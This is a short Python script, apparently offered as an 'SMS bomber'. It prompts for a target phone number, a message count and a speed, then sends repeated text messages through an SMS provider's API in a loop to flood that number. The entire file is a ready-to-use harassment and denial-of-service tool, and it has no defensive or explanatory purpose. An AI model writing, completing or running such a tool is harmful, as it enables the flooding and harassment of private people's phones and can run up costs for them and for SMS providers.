import time
import random
import requests

def send_sms(number, message):
    # Replace with your SMS API endpoint and parameters
    api_url = "https://api.your-sms-provider.com/send"
    payload = {
        'to': number,
        'message': message
    }
    response = requests.post(api_url, json=payload)
    return response.status_code

def sms_bomber(target_number, sms_count, delay):
    message = "This is a test message."
    for _ in range(sms_count):
        status = send_sms(target_number, message)
        print(f"SMS sent to {target_number}, Status Code: {status}")
        time.sleep(delay)

if __name__ == "__main__":
    target_number = input("Enter the target phone number: ")
    sms_count = int(input("Enter the number of SMS to send: "))
    speed = input("Enter 'fast' for quick sending or 'slow' for delayed sending: ")

    delay = 1 if speed.lower() == 'fast' else 5  # 1 second for fast, 5 seconds for slow
    sms_bomber(target_number, sms_count, delay)
